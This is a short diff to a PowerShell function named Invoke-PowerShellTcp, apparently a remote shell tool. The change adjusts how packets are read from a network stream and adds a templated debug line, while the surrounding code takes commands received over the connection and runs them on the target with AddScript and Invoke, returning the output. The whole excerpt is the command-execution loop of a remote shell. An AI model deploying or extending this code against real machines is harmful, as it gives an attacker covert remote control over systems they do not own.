@@ -247,12 +247,13 @@ function Invoke-PowerShellTcp
 
         $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
         $data = ""
-        while ( $packet = (Read-ShellPacket  $stream)[2] ) {
+        while ( $packet = (Read-ShellPacket $stream) ) {
             $output = ""
             if ($packet.msg_type -eq "COMMAND") {
                 $data = $packet.data
 
                 #Execute the command on the target.
+                {{'Write-Debug "Execute:`r`n$($data|format-hex)"'|debug}}
                 $PowerShell.Commands.Clear()
                 [void]$PowerShell.AddScript($data)
                 $output = ( $PowerShell.Invoke() | Out-String -Width $packet.width)
